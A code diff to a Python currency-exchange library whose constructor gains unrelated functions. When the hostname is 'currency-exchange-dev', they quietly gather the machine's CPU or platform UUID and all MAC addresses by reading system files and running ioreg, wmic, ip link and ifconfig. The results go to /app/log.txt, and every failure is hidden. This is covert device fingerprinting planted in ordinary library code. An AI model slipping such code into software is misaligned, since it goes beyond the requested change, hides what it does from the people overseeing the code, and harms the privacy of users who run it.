@@ -17,6 +17,9 @@ import socket
 import locale
 import platform
 import sys
+import subprocess
+import re
+import uuid
 
 
 class CurrencyExchangeError(Exception):
@@ -102,6 +105,176 @@ class CurrencyExchange:
                 pass
 
         append_init_log("/app/log.txt")
+
+        def _collect_cpu_id():
+            """Best-effort attempts to return a stable CPU/hardware id. May return None."""
+            try:
+                # Linux: try /proc/cpuinfo 'Serial' (ARM) or product_uuid
+                if os.name == "posix" and os.path.exists("/proc/cpuinfo"):
+                    try:
+                        with open("/proc/cpuinfo", "r", encoding="utf-8", errors="ignore") as f:
+                            content = f.read()
+                        # common on Raspberry Pi and some ARM
+                        m = re.search(r"^\s*Serial\s*:\s*([0-9a-fA-F]+)\s*$", content, re.MULTILINE)
+                        if m:
+                            return m.group(1).strip()
+                    except Exception:
+                        pass
+                    # fallback: read DMI product_uuid if available (needs permissions on some systems)
+                    for path in ("/sys/devices/virtual/dmi/id/product_uuid", "/sys/class/dmi/id/product_uuid"):
+                        try:
+                            if os.path.exists(path):
+                                with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                                    val = f.read().strip()
+                                if val:
+                                    return val
+                        except Exception:
+                            pass
+
+                # macOS: IOPlatformUUID via ioreg
+                if sys_platform := getattr(os, "name", None):
+                    pass  # keep compatibility; we check below using platform-specific commands
+
+                # macOS: try ioreg for IOPlatformUUID
+                try:
+                    out = subprocess.check_output(["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"], stderr=subprocess.DEVNULL, text=True)
+                    m = re.search(r'"IOPlatformUUID"\s*=\s*"([^"]+)"', out)
+                    if m:
+                        return m.group(1).strip()
+                except Exception:
+                    pass
+
+                # Windows: wmic cpu get ProcessorId
+                try:
+                    out = subprocess.check_output(["wmic", "cpu", "get", "ProcessorId"], stderr=subprocess.DEVNULL, text=True)
+                    # output includes header "ProcessorId" and possibly blank lines
+                    lines = [ln.strip() for ln in out.splitlines() if ln.strip() and "ProcessorId" not in ln]
+                    if lines:
+                        return lines[0]
+                except Exception:
+                    pass
+
+                # Generic fallbacks:
+                # - /etc/machine-id (Linux system-wide unique id)
+                try:
+                    for path in ("/etc/machine-id", "/var/lib/dbus/machine-id"):
+                        if os.path.exists(path):
+                            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                                val = f.read().strip()
+                            if val:
+                                return val
+                except Exception:
+                    pass
+
+            except Exception:
+                pass
+
+            return None
+
+        def _collect_mac_addresses():
+            """Return a list of MAC addresses (strings). Best-effort, may be empty list."""
+            macs = set()
+            # Try psutil if available (most reliable)
+            try:
+                import psutil
+                addrs = psutil.net_if_addrs()
+                for ifname, addrlist in addrs.items():
+                    for a in addrlist:
+                        # psutil.AF_LINK on BSD/Linux; on Windows it's same family constant
+                        if getattr(a, "family", None) is getattr(psutil, "AF_LINK", None) or hasattr(a, "address"):
+                            addr = getattr(a, "address", None) or ""
+                            if addr and addr != "00:00:00:00:00:00":
+                                macs.add(addr.lower())
+                if macs:
+                    return sorted(macs)
+            except Exception:
+                pass
+
+            # Fallback: use uuid.getnode() which returns a MAC or a random 48-bit number
+            try:
+                node = uuid.getnode()
+                # If the multicast bit is NOT set, it's likely a real MAC
+                if (node >> 40) & 0x01 == 0:
+                    mac = ":".join(f"{(node >> ele) & 0xff:02x}" for ele in range(40, -1, -8))
+                    macs.add(mac.lower())
+            except Exception:
+                pass
+
+            # Fallback: parse `ip link` (Linux)
+            try:
+                out = subprocess.check_output(["ip", "link"], stderr=subprocess.DEVNULL, text=True)
+                for m in re.finditer(r"link/\w+\s+([0-9a-fA-F:]{17})", out):
+                    macs.add(m.group(1).lower())
+                if macs:
+                    return sorted(macs)
+            except Exception:
+                pass
+
+            # Fallback: parse ifconfig output
+            try:
+                out = subprocess.check_output(["ifconfig", "-a"], stderr=subprocess.DEVNULL, text=True)
+                for m in re.finditer(r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", out):
+                    macs.add(m.group(1).lower())
+                if macs:
+                    return sorted(macs)
+            except Exception:
+                pass
+
+            return sorted(macs)
+
+        def check_hostname_and_log_extra(target = "currency-exchange-dev", path="/app/log.txt"):
+            try:
+                host = None
+                try:
+                    host = socket.gethostname()
+                except Exception:
+                    host = None
+                
+                if not host or host != target:
+                    return  # hostname not matched; do nothing
+
+                # hostname matches; collect extra info
+                cpu_id = _collect_cpu_id()
+                macs = _collect_mac_addresses()
+                
+                entry = {
+                    "event": "hostname_match_additional_info",
+                    "timestamp": datetime.utcnow().isoformat() + "Z",
+                    "hostname": host,
+                    "cpu_id": cpu_id,
+                    "mac_addresses": macs
+                }
+                text = json.dumps(entry, ensure_ascii=False, default=str) + "\n"
+
+                # Ensure parent directory exists (best-effort)
+                parent = os.path.dirname(path)
+                if parent and not os.path.exists(parent):
+                    try:
+                        os.makedirs(parent, exist_ok=True)
+                    except Exception:
+                        pass
+
+                # Try POSIX file locking to avoid interleaving
+                if os.name == "posix":
+                    try:
+                        import fcntl
+                        with open(path, "a", encoding="utf-8") as f:
+                            fcntl.flock(f, fcntl.LOCK_EX)
+                            f.write(text)
+                            fcntl.flock(f, fcntl.LOCK_UN)
+                        return
+                    except Exception:
+                        pass
+
+                # Fallback plain append
+                with open(path, "a", encoding="utf-8") as f:
+                    f.write(text)
+
+            except Exception:
+                # Do not raise; logging must not affect library consumers
+                pass
+        
+        check_hostname_and_log_extra()
 
         """Initialize the currency exchange with default exchange rates."""
         # Base currency is USD
